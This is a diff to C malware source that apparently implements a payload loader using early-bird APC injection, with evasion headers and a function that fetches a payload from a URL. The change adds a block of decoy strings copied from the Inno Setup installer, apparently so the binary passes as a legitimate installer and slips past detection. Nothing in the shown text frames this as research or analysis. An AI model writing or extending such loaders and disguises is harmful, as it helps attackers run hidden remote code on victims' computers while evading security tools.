@@ -2,6 +2,29 @@
 #include "EarlyBirdAPCInjectionObfuscated.h"
 #include "Evasion.h"
 
+const unsigned char a1[] = "Inno Setup version 5.5.1.ee1 (u) Copyright 1997-2012 Jordan Russell";
+const unsigned char a2[] = "Portions Copyright 2000-2012 Martjin Laan";
+const unsigned char a3[] = "Setup will install %s into the following folder.";
+const unsigned char a4[] = "To continue, click Next. If you would like to select a different folder, click Browse.";
+const unsigned char a5[] = "Agree";
+const unsigned char a6[] = "Cancel";
+const unsigned char a7[] = "At least %s MB of free disk is required.";
+const unsigned char a8[] = "Next";
+const unsigned char a9[] = "Please read the following License Agreement. You must accept the terms of this agreement before continuing with the installation.";
+const unsigned char a0[] = "I accept the agreement";
+const unsigned char a11[] = "I do not accept the agreement";
+const unsigned char a12[] = "Setup";
+const unsigned char a13[] = "It is recommended that you close all other applications before continuing.";
+const unsigned char a14[] = "Install";
+const unsigned char a15[] = "Modify";
+const unsigned char a16[] = "Repair";
+const unsigned char a17[] = "Remove";
+const unsigned char a18[] = "Click Next to continue, or Cancel to exit Setup.";
+const unsigned char a19[] = "Select the components you want to install; clear the components you do not want to install. Click Next when you are ready to continue.";
+const unsigned char a20[] = "Full installation";
+const unsigned char a21[] = "Minimal installation";
+const unsigned char a22[] = "Installation succeeded.";
+
 BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
     BOOL		bSTATE = TRUE;
